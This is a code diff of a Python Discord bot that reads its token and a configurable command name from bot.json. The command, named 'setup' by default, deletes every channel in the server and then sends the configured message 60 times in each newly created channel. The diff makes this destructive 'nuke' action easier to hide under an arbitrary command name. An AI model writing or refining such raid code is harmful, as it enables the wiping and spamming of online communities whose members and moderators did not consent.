@@ -2,6 +2,12 @@ import discord
 from discord.ext import commands
 import json
 
+# Load configuration from bot.json
+with open('bot.json', 'r') as f:
+    data = json.load(f)
+    bot_token = data.get('bot_token')
+    command_name = data.get('command_name', 'setup')  # Get the command name from the json file
+
 intents = discord.Intents.all()
 intents.guilds = True
 intents.messages = True
@@ -13,8 +19,7 @@ async def on_ready():
     print(f'Logged in as {bot.user.name}')
     print('Bot is ready.')
 
-@bot.command()
-async def setup(ctx):
+async def setup_command(ctx):
     await bot.wait_until_ready()  
 
     if ctx.author.guild_permissions.administrator:
@@ -22,11 +27,9 @@ async def setup(ctx):
         for channel in guild.channels:
             await channel.delete()
 
-        with open('bot.json', 'r') as f:
-            data = json.load(f)
-            channel_name = data.get('channel_name', 'gg')  
-            category_name = data.get('category_name', 'Report')  
-            message_content = data.get('message_content', 'HELLO I\'M HERE')  
+        channel_name = data.get('channel_name', 'gg')  
+        category_name = data.get('category_name', 'Report')  
+        message_content = data.get('message_content', 'HELLO I\'M HERE')  
 
         category = await guild.create_category(category_name)
 
@@ -36,12 +39,11 @@ async def setup(ctx):
                 for _ in range(60):
                     await new_channel.send(message_content)
         
-        await ctx.send(f"Setup finish ;)")
+        await ctx.send("Setup finish ;)")
     else:
-        await ctx.send("you don't have the required permissions.")
+        await ctx.send("You don't have the required permissions.")
 
-with open('bot.json', 'r') as f:
-    data = json.load(f)
-    bot_token = data.get('bot_token')
+# Dynamically add the setup command with the name specified in the json file
+bot.command(name=command_name)(setup_command)
 
 bot.run(bot_token)
